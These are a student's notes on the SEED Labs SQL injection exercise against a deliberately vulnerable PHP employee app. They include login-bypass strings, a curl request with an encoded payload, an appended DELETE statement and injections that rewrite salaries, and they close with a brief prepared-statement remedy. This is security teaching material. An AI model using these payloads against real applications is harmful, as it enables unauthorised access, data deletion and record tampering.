# SQL Injection 

## Summary 
* SQL injection attacks are due to invalidated user inputs. 
* The attackers inject inputs in the text box such that the SQL statement on the server side is reconstructed as per the attacker's needs. 
* The victims may not even know that their data is compromised. 

## Links 


## SeedLab Tasks:

#### A simple PHP application. 
* Link : https://gitlab.com/shivapbhusal/app_analysis/blob/master/security_examples/sql_injection.php

#### Seedlab tasks 
* Link : http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Web/Web_SQL_Injection/SQL_Injection.pdf

#### Task 1: Playing with the MySQL console 
```sql
mysql -u root -pseedubuntu
use Users; # name of the database 
show tables; # show all the tables in Users database 
```

#### Task 2.1 : SQL injection attack from webpage 
To simply login, attacker can type this in the Employee ID textbox 
```
a ' or 1 #

```

To login as admin, attacker can type this. We assume, attacker knows the name of admin. 
```
a ' or Name='Admin' #
```

#### Task 2.2. : From the command line 
```
curl 'http://www.seedlabsqlinjection.com/unsafe_credential.php?EID=a+%27+or+Name%3D%27Admin%27+%23&Password=aass'
``` 

#### Task 2.3. : Append a new SQL statement 
Had some issues with this. Draft script. P.S : Attacker will also not know the table name. 
```
a ';delete from credential where Name='Abc'#
```

#### Task 3.1 : Updating the salary 
Employee can't edit their salary information. But they can do this with the help of SQL injection attack. Type this in any of the field 
```
aaaaaa',salary=100000#
```

#### Task 3.2 : Updating the salary of one specific person
Set the value of first field as 
```
aaaaaa',salary=1 where Name='Ryan'#
```

& set the values of every other fields as # so that every statements executed are commented out. 

## Preventive Measures: 
* Use prepared statements as explained in the SeedLab document. 